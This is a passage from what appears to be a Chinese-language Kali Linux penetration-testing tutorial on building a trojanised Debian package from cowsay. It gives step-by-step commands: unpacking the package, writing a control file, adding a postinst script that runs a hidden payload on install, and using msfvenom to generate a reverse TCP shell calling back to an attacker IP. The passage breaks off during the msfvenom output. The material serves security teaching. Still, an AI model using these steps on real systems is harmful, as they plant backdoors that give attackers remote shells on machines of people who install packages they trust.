  \ kali-rolling/main\namd64 cowsay all 3.03+dfsg2-4 [20.1 kB]\nFetched 20.1 kB in\
  \ 1s (15.2 kB/s)\nDownload complete and in download only mode\nroot@kali:~#\n```\n\
  \n- 2. 现在我们已经下载了包，我们将把包解压到名为 `cowsay` 的新目录中：\n\n```\nroot@kali:~# dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-4_all.deb\
  \ cowsay\n```\n\n\n\n- 3. Debian 包必须遵循严格的目录结构，因此我们需要在程序的源目录下创建一个名为 DEBIAN 的子目录：\n\
  \n```\nroot@kali:~/trojan# mkdir cowsay/DEBIAN\nroot@kali:~/trojan# cd cowsay/DEBIAN/\n\
  ```\n\n- 4. 接下来，我们需要创建 control 文件，它是 Debian 包的核心，包含所有相关元数据，例如包名、版本、支持的架构和依赖项：\n\n\
  ```\nroot@kali:~/cowsay/DEBIAN# cat control\nPackage: cowsay\nVersion: 3.03+dfsg2-4\n\
  Architecture: all\nMaintainer: Francois Marier <francois@debian.org>\nInstalled-Size:\
  \ 90\nDepends: perl\nSuggests: filters\nSection: games\nPriority: optional\nHomepage:\
  \ http://www.nog.net/~tony/warez\nDescription: configurable talking cow\n  Cowsay\
  \ (or cowthink) will turn text into happy\n  ASCII cows, with speech (or thought)\
  \ balloons.\n  If you don't like cows, ASCII art is available to replace\n  it with\
  \ some other creatures (Tux, the BSD\ndaemon, dragons, and a plethora of animals,\
  \ from a\n  turkey to an elephant in a snake).\n```\n\n- 5. 然后我们将创建一个名为 postinst\
  \ 的 post-installation 文件，它将为我们的 payload 添加适当的权限，该 payload 将称为 cowsay_trojan，并执行它：\n\
  \n```\nroot@kali:~/cowsay/DEBIAN# cat postinst\nchmod 2755 /usr/games/cowsay_trojan\
  \ && /usr/games/cowsay_trojan & /usr/games/cowsay Welcome\n```\n\n- 6. 现在我们已经有了所有必需的文件，将使用\
  \ msfvenom 生成 payload：\n\n```\nroot@kali:~/cowsay/DEBIAN# msfvenom -a x64\n--platform\
  \ linux -p linux/x64/shell/reverse_tcp\nLHOST=192.168.216.5 -b \"\\x00\" -f elf\
  \ -o\n/root/cowsay/usr/games/cowsay_trojan\nFound 2 compatible encoders\nAttempting\
  \ to encode payload with 1 iterations\nof generic/none\ngeneric/none failed with\
  \ Encoding failed due to\na bad character (index=56, char=0x00)\nAttempting to encode\
  \ payload with 1 iterations\nof x64/xor\nx64/xor succeeded with size 167 (iteration=0)\n\
